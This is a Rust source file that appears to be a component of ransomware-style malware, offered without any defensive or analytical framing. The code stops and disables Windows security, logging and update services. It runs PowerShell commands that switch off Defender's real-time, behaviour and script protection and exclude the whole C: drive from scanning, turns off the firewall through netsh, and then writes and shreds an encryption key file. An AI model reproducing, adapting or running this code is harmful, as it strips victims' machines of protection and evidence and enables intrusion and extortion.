use std::fs::{OpenOptions, remove_file};
use std::io::Write;
use std::path::Path;
use std::process::Command;
use anyhow::{Context, Result};
use log::{error, warn};
use rand::RngCore;
use rand::rngs::StdRng;
use rand::SeedableRng;
use anyhow::anyhow;

const AES_KEY_SIZE: usize = 32;
const ENCRYPTION_KEY: [u8; AES_KEY_SIZE] = [0x55; AES_KEY_SIZE];

struct SystemDisabler {
    encryption_key: Vec<u8>,
}

impl SystemDisabler {
    fn new(encryption_key: Vec<u8>) -> Self {
        SystemDisabler { encryption_key }
    }

    fn disable_service(&self, service: &str) -> Result<()> {
        let output = Command::new("net")
            .args(&["stop", service, "/y"])
            .output()
            .context("Failed to stop service")?;

        if !output.status.success() {
            return Err(anyhow!("Failed to stop service: {}", service));
        }

        let output = Command::new("sc")
            .args(&["config", service, "start=", "disabled"])
            .output()
            .context("Failed to disable service")?;

        if !output.status.success() {
            return Err(anyhow!("Failed to disable service: {}", service));
        }

        Ok(())
    }

    fn disable_services(&self) -> Result<()> {
        let services = [
            "Windows Defender Service",
            "Windows Defender Antivirus Service",
            "Windows Defender Firewall",
            "Security Center",
            "Windows Firewall",
            "Windows Time",
            "Windows Update",
            "Windows Search",
            "Windows Management Instrumentation",
            "Windows Event Log",
            "Task Scheduler",
            "System Guard Runtime Monitor Broker",
            "Software Protection",
            "Shell Hardware Detection",
            "Remote Registry",
            "Windows Error Reporting Service",
            "Windows Installer",
            "Windows License Manager Service",
            "Windows Modules Installer",
            "Windows Push Notifications System Service",
            "Windows Security Service",
            "Windows Defender Advanced Threat Protection Service",
            "Microsoft Defender Antivirus Network Inspection Service",
            "Security Health Service",
        ];

        for service in services {
            if let Err(e) = self.disable_service(service) {
                warn!("Warning: Could not disable {}: {}", service, e);
            }
        }

        Ok(())
    }

    fn disable_defender(&self) -> Result<()> {
        let defender_cmds = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Add-MpPreference -ExclusionPath C:\\",
            "Set-MpPreference -DisableArchiveScanning $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
            "Set-MpPreference -DisableScriptScanning $true",
        ];

        for cmd in defender_cmds {
            let output = Command::new("powershell")
                .args(&["-Command", cmd])
                .output()
                .context("Failed to execute Defender command")?;

            if !output.status.success() {
                return Err(anyhow!("Failed to execute Defender command: {}", cmd));
            }
        }

        Ok(())
    }

    fn disable_firewall(&self) -> Result<()> {
        let output = Command::new("netsh")
            .args(&["advfirewall", "set", "allprofiles", "state=off"])
            .output()
            .context("Failed to disable Windows Firewall")?;

        if !output.status.success() {
            return Err(anyhow!("Failed to disable Windows Firewall"));
        }

        Ok(())
    }

    fn shred_key(&self) -> Result<()> {
        let key_file_path = Path::new("key.bin");
        let mut key_file = OpenOptions::new()
            .create_new(true)
            .write(true)
            .open(key_file_path)
            .context("Failed to open key file")?;

        key_file.write_all(&self.encryption_key)?;

        let mut rng = StdRng::from_entropy();

        for _ in 0..50 {
            let mut key_file = OpenOptions::new()
                .write(true)
                .open(key_file_path)
                .context("Failed to open key file")?;

            key_file.write_all(&vec![0u8; AES_KEY_SIZE])?;
            key_file.write_all(&vec![0xFFu8; AES_KEY_SIZE])?;

            let mut random_data = vec![0u8; AES_KEY_SIZE];
            rng.fill_bytes(&mut random_data);
            key_file.write_all(&random_data)?;
            key_file.sync_all()?;
        }

        if let Err(e) = remove_file(key_file_path) {
            error!("Error removing file: {}", e);
        }

        Ok(())
    }
}

fn main() -> Result<()> {
    env_logger::init();

    let encryption_key = ENCRYPTION_KEY.to_vec();
    let disabler = SystemDisabler::new(encryption_key);

    if let Err(e) = disabler.disable_services() {
        error!("Error disabling services: {}", e);
    }

    if let Err(e) = disabler.disable_defender() {
        error!("Error disabling Defender: {}", e);
    }

    if let Err(e) = disabler.disable_firewall() {
        error!("Error disabling Windows Firewall: {}", e);
    }

    if let Err(e) = disabler.shred_key() {
        error!("Error shredding encryption key: {}", e);
    }

    Ok(())
}

